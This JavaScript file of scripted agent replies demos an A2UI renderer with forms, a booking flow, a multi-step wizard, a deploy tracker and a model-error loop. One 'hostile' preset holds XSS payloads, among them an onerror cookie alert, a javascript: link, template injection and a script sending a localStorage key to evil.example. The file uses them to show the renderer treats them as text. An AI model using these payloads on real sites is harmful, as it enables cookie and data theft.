// Agent replies written in advance. Each one shows a different part of A2UI: components, actions, messages over time, what gets refused.
import { BASIC_CATALOG } from './protocol.js';

const surface = (surfaceId, components, dataModel) => ({
  version: '1.0',
  createSurface: { surfaceId, catalogId: BASIC_CATALOG, ...(dataModel ? { dataModel } : {}), components },
});

const text = (id, value, variant) => ({ id, component: 'Text', text: value, ...(variant ? { variant } : {}) });
const path = (p) => ({ '@path': p });
const call = (name, args) => ({ '@call': name, args });
const button = (id, label, event, variant, extra = {}) => [
  { id, component: 'Button', child: `${id}_label`, ...(variant ? { variant } : {}), action: { event }, ...extra },
  text(`${id}_label`, label),
];
const update = (surfaceId, components) => ({ version: '1.0', updateComponents: { surfaceId, components } });
const data = (surfaceId, p, value) => ({ version: '1.0', updateDataModel: { surfaceId, path: p, value } });

const contact = [surface('contact_form', [
  { id: 'root', component: 'Card', child: 'form' },
  { id: 'form', component: 'Column', children: ['title', 'intro', 'name', 'email', 'topic', 'message', 'updates', 'send'] },
  text('title', '# Get in touch'),
  text('intro', 'I read every message and reply within a few days.', 'caption'),
  { id: 'name', component: 'TextField', label: 'Name', value: path('/contact/name'),
    '@checks': [{ condition: call('required', { value: path('/contact/name') }), message: 'Tell me your name.' }] },
  { id: 'email', component: 'TextField', label: 'Email', value: path('/contact/email'), placeholder: 'you@example.com',
    '@checks': [
      { condition: call('required', { value: path('/contact/email') }), message: 'Enter your email address.' },
      { condition: call('email', { value: path('/contact/email') }), message: 'Enter an email address like you@example.com.' },
    ] },
  { id: 'topic', component: 'ChoicePicker', label: 'What is it about?', variant: 'multipleSelection', value: path('/contact/topic'),
    options: [{ label: 'A talk', value: 'talk' }, { label: 'Consulting', value: 'consulting' }, { label: 'Something else', value: 'other' }] },
  { id: 'message', component: 'TextField', label: 'Message', variant: 'longText', value: path('/contact/message'),
    '@checks': [{ condition: call('length', { value: path('/contact/message'), min: 10 }), message: 'Write at least 10 characters.' }] },
  { id: 'updates', component: 'CheckBox', label: 'Send me the monthly notes', value: path('/contact/updates') },
  { id: 'send', component: 'Button', child: 'send_label', variant: 'primary',
    action: { event: { name: 'submitContact', context: { name: path('/contact/name'), email: path('/contact/email'), topic: path('/contact/topic') } } },
    '@checks': [{ condition: call('and', { values: [
      call('required', { value: path('/contact/name') }),
      call('email', { value: path('/contact/email') }),
      call('length', { value: path('/contact/message'), min: 10 }),
    ] }), message: 'Add your name, a valid email and a message of 10 characters or more.' }] },
  text('send_label', 'Send message'),
], { contact: { name: 'Ayu', email: 'ayu@', topic: ['talk'], message: '', updates: true } })];

const reading = [surface('reading_list', [
  { id: 'root', component: 'Column', children: ['heading', 'list'] },
  text('heading', '# Reading list'),
  { id: 'list', component: 'List', children: { componentId: 'post', path: '/posts' } },
  { id: 'post', component: 'Card', child: 'post_row' },
  { id: 'post_row', component: 'Row', children: ['post_text', 'save'], justify: 'spaceBetween', align: 'center' },
  { id: 'post_text', component: 'Column', children: ['post_title', 'post_meta'] },
  text('post_title', path('title')),
  text('post_meta', path('meta'), 'caption'),
  { id: 'save', component: 'Button', child: 'save_label',
    action: { event: { name: 'savePost', context: { title: path('title'), position: call('@index', { offset: 1 }) } } } },
  text('save_label', 'Save for later'),
], { posts: [
  { title: 'Font split inspector', meta: 'lab · 2026-11-20' },
  { title: 'Core Web Vitals in WordPress', meta: 'talk · 2026-11-08' },
  { title: 'Passkeys on a WordPress login', meta: 'guide · 2026-10-30' },
] })];

const booking = [surface('booking', [
  { id: 'root', component: 'Card', child: 'body' },
  { id: 'body', component: 'Column', children: ['title', 'when', 'rule', 'guests', 'guests_note', 'outdoor', 'actions'] },
  text('title', '# Confirm your table'),
  text('when', call('formatString', { value: '${/booking/place} · ${/booking/when}' }), 'caption'),
  { id: 'rule', component: 'Divider' },
  { id: 'guests', component: 'Slider', label: 'Guests', min: 1, max: 8, steps: 7, value: path('/booking/guests') },
  text('guests_note', call('formatString', { value: 'A table for ${/booking/guests}.' })),
  { id: 'outdoor', component: 'CheckBox', label: 'Outdoor seating', value: path('/booking/outdoor') },
  { id: 'actions', component: 'Row', children: ['confirm', 'change'], align: 'center' },
  { id: 'confirm', component: 'Button', child: 'confirm_label', variant: 'primary',
    action: { event: { name: 'confirmBooking', userMessage: 'Confirmed the booking', context: { guests: path('/booking/guests'), outdoor: path('/booking/outdoor') } } } },
  text('confirm_label', 'Confirm booking'),
  { id: 'change', component: 'Button', child: 'change_label', variant: 'borderless', action: { event: { name: 'changeTime' } } },
  text('change_label', 'Change time'),
], { booking: { place: 'Warung Pojok', when: 'Sat 2026-11-28, 19:00', guests: 2, outdoor: false } })];

// What a real agent might answer to confirmBooking. The page says this reply is scripted.
const bookingReply = [{
  version: '1.0',
  updateComponents: { surfaceId: 'booking', components: [
    { id: 'root', component: 'Card', child: 'done' },
    { id: 'done', component: 'Column', children: ['done_title', 'done_text', 'done_back'] },
    text('done_title', '# Booked'),
    text('done_text', call('formatString', { value: 'A table for ${/booking/guests} at ${/booking/place}, ${/booking/when}. The confirmation is on its way.' })),
    { id: 'done_back', component: 'Button', child: 'done_back_label', variant: 'borderless', action: { event: { name: 'changeTime' } } },
    text('done_back_label', 'Change the booking'),
  ] },
}];

const settings = [surface('settings', [
  { id: 'root', component: 'Tabs', tabs: [
    { title: 'Profile', child: 'profile' },
    { title: 'Reading', child: 'reading' },
    { title: 'Trip', child: 'trip' },
  ] },
  { id: 'profile', component: 'Column', children: ['p_name', 'p_site', 'p_save'] },
  { id: 'p_name', component: 'TextField', label: 'Display name', value: path('/profile/name'),
    '@checks': [{ condition: call('length', { value: path('/profile/name'), min: 1, max: 40 }), message: 'Use 1 to 40 characters.' }] },
  { id: 'p_site', component: 'TextField', label: 'Website', value: path('/profile/site') },
  { id: 'p_save', component: 'Button', child: 'p_save_label', variant: 'primary',
    action: { event: { name: 'saveProfile', context: { name: path('/profile/name'), site: path('/profile/site') } } } },
  text('p_save_label', 'Save profile'),
  { id: 'reading', component: 'Column', children: ['r_size', 'r_size_text', 'r_digest'] },
  { id: 'r_size', component: 'Slider', label: 'Text size', min: 14, max: 22, steps: 8, value: path('/reading/size') },
  text('r_size_text', call('formatString', { value: 'Body text at ${/reading/size}px.' }), 'caption'),
  { id: 'r_digest', component: 'ChoicePicker', label: 'Email digest', variant: 'mutuallyExclusive', value: path('/reading/digest'),
    options: [{ label: 'Daily', value: 'daily' }, { label: 'Weekly', value: 'weekly' }, { label: 'Never', value: 'never' }] },
  { id: 'trip', component: 'Column', children: ['t_date', 't_budget', 't_budget_text'] },
  { id: 't_date', component: 'DateTimeInput', label: 'Departure', enableDate: true, value: path('/trip/date') },
  { id: 't_budget', component: 'TextField', label: 'Budget in rupiah', variant: 'number', value: path('/trip/budget'),
    '@checks': [{ condition: call('numeric', { value: path('/trip/budget'), min: 0 }), message: 'Enter a number, 0 or more.' }] },
  text('t_budget_text', call('formatCurrency', { value: path('/trip/budget'), currency: 'IDR', decimals: 0 }), 'caption'),
], { profile: { name: 'Ivan', site: 'ivankristianto.com' }, reading: { size: 17, digest: ['weekly'] }, trip: { date: '2026-12-20', budget: 4500000 } })];

// Three-step flow: every Next is an action, every step is the agent's scripted reply.
const wizard = [surface('workshop', [
  { id: 'root', component: 'Card', child: 'step' },
  { id: 'step', component: 'Column', children: ['s1_title', 's1_note', 's1_name', 's1_email', 's1_next'] },
  text('s1_title', '# Workshop sign-up'),
  text('s1_note', 'Step 1 of 3 · about you', 'caption'),
  { id: 's1_name', component: 'TextField', label: 'Name', value: path('/signup/name'),
    '@checks': [{ condition: call('required', { value: path('/signup/name') }), message: 'Tell me your name.' }] },
  { id: 's1_email', component: 'TextField', label: 'Email', value: path('/signup/email'),
    '@checks': [{ condition: call('email', { value: path('/signup/email') }), message: 'Enter an email address like you@example.com.' }] },
  ...button('s1_next', 'Next: pick a session', { name: 'toSession', context: { name: path('/signup/name'), email: path('/signup/email') } }, 'primary',
    { '@checks': [{ condition: call('and', { values: [call('required', { value: path('/signup/name') }), call('email', { value: path('/signup/email') })] }), message: 'Fill in both fields first.' }] }),
], { signup: { name: 'Ayu', email: 'ayu@example.com', session: [], laptop: true } })];

const wizardReplies = {
  toSession: [update('workshop', [
    { id: 'step', component: 'Column', children: ['s2_title', 's2_note', 's2_session', 's2_laptop', 's2_next'] },
    text('s2_title', '# Pick a session'),
    text('s2_note', call('formatString', { value: 'Step 2 of 3 · hi ${/signup/name}' }), 'caption'),
    { id: 's2_session', component: 'ChoicePicker', label: 'Session', variant: 'mutuallyExclusive', value: path('/signup/session'),
      options: [{ label: 'Saturday 2026-12-05, 09:00', value: 'Saturday 2026-12-05, 09:00' }, { label: 'Sunday 2026-12-06, 13:00', value: 'Sunday 2026-12-06, 13:00' }],
      '@checks': [{ condition: call('required', { value: path('/signup/session') }), message: 'Pick one session.' }] },
    { id: 's2_laptop', component: 'CheckBox', label: 'I will bring a laptop', value: path('/signup/laptop') },
    ...button('s2_next', 'Next: review', { name: 'toReview', context: { session: path('/signup/session'), laptop: path('/signup/laptop') } }, 'primary',
      { '@checks': [{ condition: call('required', { value: path('/signup/session') }), message: 'Pick a session first.' }] }),
  ])],
  toReview: [update('workshop', [
    { id: 'step', component: 'Column', children: ['s3_title', 's3_note', 's3_who', 's3_rule', 's3_actions'] },
    text('s3_title', '# Check and confirm'),
    text('s3_note', 'Step 3 of 3 · nothing is booked until you confirm', 'caption'),
    text('s3_who', call('formatString', { value: '${/signup/name} (${/signup/email}), ${/signup/session/0}.' })),
    { id: 's3_rule', component: 'Divider' },
    { id: 's3_actions', component: 'Row', children: ['s3_confirm', 's3_restart'], align: 'center' },
    ...button('s3_confirm', 'Confirm my seat', { name: 'confirmSeat', userMessage: 'Confirmed the workshop seat', context: { name: path('/signup/name'), session: path('/signup/session') } }, 'primary'),
    ...button('s3_restart', 'Start over', { name: 'startOver' }, 'borderless'),
  ])],
  confirmSeat: [
    data('workshop', '/signup/ticket', 'WS-0412'),
    update('workshop', [
      { id: 'step', component: 'Column', children: ['s4_title', 's4_text'] },
      text('s4_title', '# You are in'),
      text('s4_text', call('formatString', { value: 'Ticket ${/signup/ticket}. A confirmation goes to ${/signup/email}.' })),
    ]),
  ],
  startOver: [update('workshop', [
    { id: 'step', component: 'Column', children: ['s1_title', 's1_note', 's1_name', 's1_email', 's1_next'] },
  ])],
};

// Two surfaces in one conversation: an action on one changes the other.
const trip = [
  surface('flights', [
    { id: 'root', component: 'Column', children: ['title', 'list'] },
    text('title', '# Flights to Yogyakarta'),
    { id: 'list', component: 'List', children: { componentId: 'flight', path: '/flights' } },
    { id: 'flight', component: 'Card', child: 'flight_row' },
    { id: 'flight_row', component: 'Row', children: ['flight_text', 'pick'], justify: 'spaceBetween', align: 'center' },
    { id: 'flight_text', component: 'Column', children: ['flight_name', 'flight_meta'] },
    text('flight_name', path('code')),
    text('flight_meta', path('when'), 'caption'),
    ...button('pick', 'Pick', { name: 'pickFlight', context: { code: path('code'), when: path('when') } }),
  ], { flights: [{ code: 'GA 204', when: 'Sat 07:10, 1 h 10 min' }, { code: 'QZ 7550', when: 'Sat 12:45, 1 h 15 min' }] }),
  surface('trip', [
    { id: 'root', component: 'Card', child: 'trip_body' },
    { id: 'trip_body', component: 'Column', children: ['trip_title', 'trip_flight', 'trip_hotel'] },
    text('trip_title', '# Your trip'),
    text('trip_flight', call('formatString', { value: 'Flight: ${/flight}' })),
    text('trip_hotel', call('formatString', { value: 'Hotel: ${/hotel}' }), 'caption'),
  ], { flight: 'not picked yet', hotel: 'not picked yet' }),
];
const tripReplies = { pickFlight: [
  data('trip', '/flight', 'GA 204, Sat 07:10'),
  update('flights', [
    { id: 'root', component: 'Column', children: ['title', 'done'] },
    text('done', 'Flight picked. Hotels are next, in the trip card.', 'caption'),
  ]),
] };

// A live tracker: after the first message, only data changes. Played one message at a time.
const tracker = [
  surface('deploy', [
    { id: 'root', component: 'Card', child: 'body' },
    { id: 'body', component: 'Column', children: ['title', 'status', 'log'] },
    text('title', '# Deploying ik2-lab v1.4.0'),
    text('status', call('formatString', { value: 'Step ${/step} of 4: ${/status}' })),
    { id: 'log', component: 'List', children: { componentId: 'log_line', path: '/log' } },
    text('log_line', path('line'), 'caption'),
  ], { step: 1, status: 'building the image', log: [{ line: '09:00:01 build started' }] }),
  data('deploy', '/log/1', { line: '09:00:42 image pushed' }),
  data('deploy', '/step', 2),
  data('deploy', '/status', 'starting the new container'),
  data('deploy', '/log/2', { line: '09:00:55 health check passed' }),
  data('deploy', '/step', 3),
  data('deploy', '/status', 'switching traffic'),
  data('deploy', '/log/3', { line: '09:01:03 traffic on the new container' }),
  data('deploy', '/step', 4),
  data('deploy', '/status', 'done'),
  update('deploy', [
    { id: 'body', component: 'Column', children: ['title', 'status', 'log', 'open'] },
    ...button('open', 'Open the site', { name: 'openSite' }, 'primary'),
  ]),
];

// Six messages: build a surface, fill it in, change it, add to it, and create then delete a second one.
const stream = [
  surface('order', [
    { id: 'root', component: 'Card', child: 'body' },
    { id: 'body', component: 'Column', children: ['title', 'status', 'eta'] },
    text('title', '# Order 1042'),
    text('status', call('formatString', { value: 'Status: ${/order/status}' })),
    text('eta', call('formatString', { value: 'Arrives ${/order/eta}' }), 'caption'),
  ], { order: { status: 'preparing', eta: 'soon' } }),
  data('order', '/order/status', 'on the way'),
  data('order', '/order/eta', 'by 19:40'),
  update('order', [
    { id: 'body', component: 'Column', children: ['title', 'status', 'eta', 'rule', 'track'] },
    { id: 'rule', component: 'Divider' },
    ...button('track', 'Message the driver', { name: 'messageDriver' }),
  ]),
  surface('promo', [text('root', 'Free delivery on your next order')]),
  { version: '1.0', deleteSurface: { surfaceId: 'promo' } },
];

// Valid A2UI that carries HTML and script in its strings. It all draws as text.
const hostile = [surface('hostile', [
  { id: 'root', component: 'Card', child: 'body' },
  { id: 'body', component: 'Column', children: ['title', 'img', 'script', 'link', 'field', 'long', 'go'] },
  text('title', '# Totally normal settings'),
  text('img', '<img src=x onerror="alert(document.cookie)">'),
  text('script', path('/bio')),
  text('link', '[Claim your prize](javascript:alert(1))'),
  { id: 'field', component: 'TextField', label: '<b>Name</b>', value: path('/name'), placeholder: '"><svg onload=alert(1)>' },
  text('long', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'caption'),
  ...button('go', '<script>steal()</script>', { name: 'save', context: { name: path('/name') } }, 'primary'),
], { bio: '</p><script>fetch("https://evil.example/?k="+localStorage.key)</script>', name: '{{constructor.constructor("alert(1)")()}}' })];

// Mistakes models make when they write A2UI from memory. The validator names each one.
const mistakes = [
  { createSurface: { surfaceId: 'signup', catalogId: BASIC_CATALOG, theme: { primaryColor: '#ff0000' }, components: [
    { id: 'root', component: 'Column', children: ['email', 'submit', 'hero'] },
    { id: 'email', component: 'TextField', label: 'Email', text: { path: '/user/email' } },
    { id: 'submit', component: 'Button', label: 'Submit', action: { name: 'submit' } },
    { id: 'hero', component: 'Image', url: 'https://example.com/hero.png' },
  ] } },
];

// The error loop: a bad update, the renderer's error message back to the agent, and the agent's fix.
const selfcorrect = [
  surface('rsvp', [
    { id: 'root', component: 'Card', child: 'body' },
    { id: 'body', component: 'Column', children: ['title', 'name'] },
    text('title', '# RSVP for Sunday lunch'),
    { id: 'name', component: 'TextField', label: 'Your name', value: path('/rsvp/name') },
  ], { rsvp: { name: 'Ayu' } }),
  update('rsvp', [
    { id: 'body', component: 'Column', children: ['title', 'name', 'go'] },
    { id: 'go', component: 'Button', label: 'Count me in', action: { event: { name: 'rsvpYes' } } },
  ]),
  update('rsvp', [
    { id: 'body', component: 'Column', children: ['title', 'name', 'go'] },
    ...button('go', 'Count me in', { name: 'rsvpYes', context: { name: path('/rsvp/name') } }, 'primary'),
  ]),
];

// sendDataModel: every message to the agent carries the surface's whole data model. Preview runs a function locally.
const feedback = [{
  version: '1.0',
  createSurface: { surfaceId: 'survey', catalogId: BASIC_CATALOG, sendDataModel: true, dataModel: { survey: { stars: 4, again: true, note: 'More time for questions, please.', internalId: 'u-8812' } }, components: [
    { id: 'root', component: 'Card', child: 'body' },
    { id: 'body', component: 'Column', children: ['title', 'stars', 'again', 'note', 'actions'] },
    text('title', '# How was the workshop?'),
    { id: 'stars', component: 'Slider', label: 'Stars', min: 1, max: 5, steps: 4, value: path('/survey/stars') },
    { id: 'again', component: 'CheckBox', label: 'I would come again', value: path('/survey/again') },
    { id: 'note', component: 'TextField', label: 'Anything else?', variant: 'longText', value: path('/survey/note') },
    { id: 'actions', component: 'Row', children: ['send', 'preview'], align: 'center' },
    ...button('send', 'Send feedback', { name: 'sendFeedback' }, 'primary'),
    { id: 'preview', component: 'Button', child: 'preview_label', variant: 'borderless',
      action: { functionCall: call('formatString', { value: '${/survey/stars} stars. ${/survey/note}' }) } },
    text('preview_label', 'Preview my feedback'),
  ] },
}];

// group puts the preset under a heading in the picker; shows is the hint under it; steps adds the step-through control.
export const PRESETS = [
  { id: 'contact', group: 'forms and layout', label: 'contact form', messages: contact,
    shows: 'Fields bound to a data model, with checks on each field and on the button. The email starts wrong on purpose.' },
  { id: 'reading', group: 'forms and layout', label: 'reading list', messages: reading,
    shows: 'One Card template, drawn once for each post in the data model. Each Save button sends its own post.' },
  { id: 'settings', group: 'forms and layout', label: 'settings with tabs', messages: settings,
    shows: 'Tabs, a Slider, a date field and formatCurrency, all bound to one data model.' },
  { id: 'booking', group: 'actions and replies', label: 'booking confirmation', messages: booking, replies: { confirmBooking: bookingReply },
    shows: 'Press Confirm booking: the action goes to the agent, and a scripted reply redraws the card.' },
  { id: 'wizard', group: 'actions and replies', label: 'three-step sign-up', messages: wizard, replies: wizardReplies,
    shows: 'Three turns. Each Next is an action and each step is the agent\'s reply. What you type survives every redraw.' },
  { id: 'feedback', group: 'actions and replies', label: 'feedback with the data model attached', messages: feedback,
    shows: 'sendDataModel is on, so Send feedback carries the whole data model, a field no one sees included. Preview runs in the renderer and sends nothing.' },
  { id: 'trip', group: 'actions and replies', label: 'two surfaces, one conversation', messages: trip, replies: tripReplies,
    shows: 'Two surfaces on one screen. Pick a flight: one action, and the reply changes both surfaces.' },
  { id: 'tracker', group: 'messages over time', label: 'live tracker, data only', messages: tracker, steps: true,
    shows: 'One createSurface, then only updateDataModel. The card changes and no component is sent twice. Press Play all.' },
  { id: 'lifecycle', group: 'messages over time', label: 'a surface from start to finish', messages: stream, steps: true,
    shows: 'All four message types in order, and a second surface created then deleted. Step through them.' },
  { id: 'selfcorrect', group: 'messages over time', label: 'an agent that fixes its mistake', messages: selfcorrect, steps: true,
    shows: 'Message 2 is wrong, so the renderer sends an error back instead of drawing it. Message 3 is the agent\'s fix. Step through.' },
  { id: 'hostile', group: 'what gets caught', label: 'hostile response', messages: hostile,
    shows: 'Valid A2UI with HTML and script in its strings. A2UI sends no code, so all of it draws as plain text.' },
  { id: 'mistakes', group: 'what gets caught', label: 'what models get wrong', messages: mistakes,
    shows: 'Mistakes models make when they write A2UI from memory. Nothing is drawn; each problem is named instead.' },
];

export const toJSON = (messages) => JSON.stringify(messages, null, 2);
